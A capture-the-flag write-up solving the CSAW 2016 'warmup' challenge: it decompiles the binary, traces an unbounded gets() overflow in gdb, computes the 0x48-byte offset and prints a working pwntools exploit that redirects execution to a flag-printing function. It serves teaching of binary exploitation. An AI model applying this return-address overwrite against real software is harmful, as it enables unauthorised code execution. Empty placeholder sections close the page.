---
search:
  exclude: true
---
# CSAW 2016 Warmup

## Downloading the binary file: 
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [binexp/2/warmup]
    → wget https://github.com/guyinatuxedo/nightmare/raw/master/modules/05-bof_callfunction/csaw16_warmup/warmup
    --2021-02-27 11:02:37--  https://github.com/guyinatuxedo/nightmare/raw/master/modules/05-bof_callfunction/csaw16_warmup/warmup
    Resolving github.com (github.com)... 140.82.121.4
    Connecting to github.com (github.com)|140.82.121.4|:443... connected.
    HTTP request sent, awaiting response... 302 Found
    Location: https://raw.githubusercontent.com/guyinatuxedo/nightmare/master/modules/05-bof_callfunction/csaw16_warmup/warmup [following]
    --2021-02-27 11:02:38--  https://raw.githubusercontent.com/guyinatuxedo/nightmare/master/modules/05-bof_callfunction/csaw16_warmup/warmup
    Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.109.133, 185.199.111.133, ...
    Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 8705 (8.5K) [application/octet-stream]
    Saving to: ‘warmup’
    
    warmup                                                                          100%[=======================================================================================================================================================================================================>]   8.50K  --.-KB/s    in 0.001s
    
    2021-02-27 11:02:38 (7.11 MB/s) - ‘warmup’ saved [8705/8705]
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [binexp/2/warmup]
    → file warmup
    warmup: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ab209f3b8a3c2902e1a2ecd5bb06e258b45605a4, not stripped
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [binexp/2/warmup]
    → chmod +x warmup
    

` ![]()

## Solution 

first of all let's see what we get when we run the binary file: 
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [binexp/2/warmup]
    → ./warmup
    -Warm Up-
    WOW:0x40060d
    >something
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [binexp/2/warmup]
    → ./warmup
    -Warm Up-
    WOW:0x40060d
    >something2
    
    

First there is some text getting displayed, we get an address '0x40060d', then we get prompted for text input and nothing after that. So let's check what the binary file looks like in ghidra:

![](14.png)
    
    
    void main(void)
    
    {
      char local_88 [64];
      char local_48 [64];
      
      write(1,"-Warm Up-\n",10);
      write(1,&DAT;_0040074c,4);
      sprintf(local_88,"%p\n",easy);
      write(1,local_88,9);
      write(1,&DAT;_00400755,1);
      gets(local_48);
      return;
    }
    
    

Here we see the main function disassembled code, which is rather simplistic, we also see that our input text gets put into the local_48 variable at -0x48 on the stack: 
    
    
                                 **************************************************************
                                 *                          FUNCTION                          *
                                 **************************************************************
                                 undefined main()
                 undefined         AL:1           
                 undefined1        Stack[-0x48]:1 local_48                                XREF[1]:     00400692(*)  
                 undefined1        Stack[-0x88]:1 local_88                                XREF[2]:     0040064d(*), 
                                                                                                       00400668(*)  
                                 main                                            XREF[5]:     Entry Point(*), 
                                                                                              _start:0040053d(*), 
                                                                                              _start:0040053d(*), 0040077c, 
                                                                                              00400830(*)  
            0040061d 55              PUSH       RBP
    
    

However most importantly, we see that the address being printed is the address of the function called 'easy' at 0x40060d

![](15.png)

this function is supposed to print the contents of flag.txt for us. Now before that, in the main function we see that our local_48 input text variable gets passed through a 'gets' function, this is a bug because it does not limit how much data it scans in. We also see the following: 
    
    
    
    void main(void)
    
    {
      char local_88 [64];
      char local_48 [64];
    
    

our local input variable (local_48) can only hold 64 bytes of data, after we write those 64 bytes of data, we overflow the buffer and start overwriting other things in memory. With this bug we can reach the return address (the address after the ret call) and with this we want to make use of the 'easy function to print us the flag. so let's use gdb to see how much data we need to send BEFORE overwriting the return address:
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [binexp/2/warmup]
    → gdb warmup
    
    GNU gdb (Debian 10.1-1.7) 10.1.90.20210103-git
    Copyright (C) 2021 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later 
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.
    Type "show copying" and "show warranty" for details.
    This GDB was configured as "x86_64-linux-gnu".
    Type "show configuration" for configuration details.
    For bug reporting instructions, please see:
    .
    Find the GDB manual and other documentation resources online at:
        .
    
    For help, type "help".
    Type "apropos word" to search for commands related to "word"...
    GEF for linux ready, type `gef' to start, `gef config' to configure
    92 commands loaded for GDB 10.1.90.20210103-git using Python engine 3.9
    Reading symbols from warmup...
    (No debugging symbols found in warmup)
    gef➤
    gef➤  disas main
    Dump of assembler code for function main:
       0x000000000040061d <+0>:     push   rbp
       0x000000000040061e <+1>:     mov    rbp,rsp
       0x0000000000400621 <+4>:     add    rsp,0xffffffffffffff80
       0x0000000000400625 <+8>:     mov    edx,0xa
       0x000000000040062a <+13>:    mov    esi,0x400741
       0x000000000040062f <+18>:    mov    edi,0x1
       0x0000000000400634 <+23>:    call   0x4004c0 
       0x0000000000400639 <+28>:    mov    edx,0x4
       0x000000000040063e <+33>:    mov    esi,0x40074c
       0x0000000000400643 <+38>:    mov    edi,0x1
       0x0000000000400648 <+43>:    call   0x4004c0 
       0x000000000040064d <+48>:    lea    rax,[rbp-0x80]
       0x0000000000400651 <+52>:    mov    edx,0x40060d
       0x0000000000400656 <+57>:    mov    esi,0x400751
       0x000000000040065b <+62>:    mov    rdi,rax
       0x000000000040065e <+65>:    mov    eax,0x0
       0x0000000000400663 <+70>:    call   0x400510 
       0x0000000000400668 <+75>:    lea    rax,[rbp-0x80]
       0x000000000040066c <+79>:    mov    edx,0x9
       0x0000000000400671 <+84>:    mov    rsi,rax
       0x0000000000400674 <+87>:    mov    edi,0x1
       0x0000000000400679 <+92>:    call   0x4004c0 
       0x000000000040067e <+97>:    mov    edx,0x1
       0x0000000000400683 <+102>:   mov    esi,0x400755
       0x0000000000400688 <+107>:   mov    edi,0x1
       0x000000000040068d <+112>:   call   0x4004c0 
       0x0000000000400692 <+117>:   lea    rax,[rbp-0x40]
       0x0000000000400696 <+121>:   mov    rdi,rax
       0x0000000000400699 <+124>:   mov    eax,0x0
       0x000000000040069e <+129>:   call   0x400500 
       0x00000000004006a3 <+134>:   leave
       0x00000000004006a4 <+135>:   ret
    gef➤  b *main +134
    Breakpoint 1 at 0x4006a3
    

here we want the first breakpoint right before the return call at +134, then we run the binary:
    
    
    gef➤  r
    Starting program: /home/nothing/binexp/2/warmup/warmup
    -Warm Up-
    WOW:0x40060d
    >13371337
    
    Breakpoint 1, 0x00000000004006a3 in main ()
    [ Legend: Modified register | Code | Heap | Stack | String ]
    ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
    $rax   : 0x00007fffffffe0b0  →  "13371337"
    $rbx   : 0x0
    $rcx   : 0x00007ffff7fac980  →  0x00000000fbad2288
    $rdx   : 0x0
    $rsp   : 0x00007fffffffe070  →  "0x40060d\n"
    $rbp   : 0x00007fffffffe0f0  →  0x00000000004006b0  →  <__libc_csu_init+0> push r15
    $rsi   : 0x31373333
    $rdi   : 0x00007ffff7faf680  →  0x0000000000000000
    $rip   : 0x00000000004006a3  →   leave
    $r8    : 0x00007fffffffe0b0  →  "13371337"
    $r9    : 0x0
    $r10   : 0x6e
    $r11   : 0x246
    $r12   : 0x0000000000400520  →  <_start+0> xor ebp, ebp
    $r13   : 0x0
    $r14   : 0x0
    $r15   : 0x0
    $eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
    $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
    ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
    0x00007fffffffe070│+0x0000: "0x40060d\n"         ← $rsp
    0x00007fffffffe078│+0x0008: 0x000000000000000a
    0x00007fffffffe080│+0x0010: 0x0000000000000000
    0x00007fffffffe088│+0x0018: 0x0000000000000000
    0x00007fffffffe090│+0x0020: 0x0000000000000000
    0x00007fffffffe098│+0x0028: 0x0000000000000000
    0x00007fffffffe0a0│+0x0030: 0x0000000000000000
    0x00007fffffffe0a8│+0x0038: 0x00000000000000c2
    ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
         0x400694        rex.RB ror BYTE PTR [r8-0x77], 0xc7
         0x400699        mov    eax, 0x0
         0x40069e        call   0x400500 
     →   0x4006a3        leave
         0x4006a4        ret
         0x4006a5                  nop    WORD PTR cs:[rax+rax*1+0x0]
         0x4006af                  nop
         0x4006b0 <__libc_csu_init+0> push   r15
         0x4006b2 <__libc_csu_init+2> mov    r15d, edi
    ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
    [#0] Id 1, Name: "warmup", stopped 0x4006a3 in main (), reason: BREAKPOINT
    ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
    [#0] 0x4006a3 → main()
    ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    gef➤
    

We gave it a simple pattern '13371337' so now we search for that pattern:
    
    
    gef➤  search-pattern 13371337
    [+] Searching '13371337' in memory
    [+] In '[heap]'(0x602000-0x623000), permission=rw-
      0x6022a0 - 0x6022aa  →   "13371337\n"
    [+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
      **0x7fffffffe0b0** - 0x7fffffffe0b8  →   "13371337"
    
    gef➤  i f
    Stack level 0, frame at 0x7fffffffe100:
     rip = 0x4006a3 in main; saved rip = 0x7ffff7e14d0a
     Arglist at 0x7fffffffe0f0, args:
     Locals at 0x7fffffffe0f0, Previous frame's sp is 0x7fffffffe100
     Saved registers:
      rbp at 0x7fffffffe0f0, rip at **0x7fffffffe0f8**
    
    

Now let's calculate the offset:
    
    
    >>> hex(0x7fffffffe0f8 - 0x7fffffffe0b0)
    '0x48'
    

So now we know that after 0x48 bytes of input, we start overwriting the return address, so we can write the following exploit:
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [binexp/2/warmup]
    → vim exploit.py
    
    
    
    
    from pwn import *
    
    target = process('./warmup')
    
    # Make the payload
    payload =  b""
    payload += b"0"*0x48 # Overflow the buffer up to the return address
    payload += p64(0x40060d) # Overwrite the return address with the address of the `easy` function
    
    # Send the payload
    target.sendline(payload)
    
    target.interactive()
    
    

Then run it:
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/3 ] [binexp/2/warmup]
    → python3 exploit.py
    [+] Starting local process './warmup': pid 78458
    [*] Switching to interactive mode
    -Warm Up-
    WOW:0x40060d
    >flag{g0ttem_b0yz}
    [*] Got EOF while reading in interactive
    $ exit
    [*] Process './warmup' stopped with exit code -11 (SIGSEGV) (pid 78458)
    [*] Got EOF while sending in interactive
    

and we got the flag !

## Title 

text 
    
    
    

` ![]()

## Title 

text 
    
    
    

` ![]()

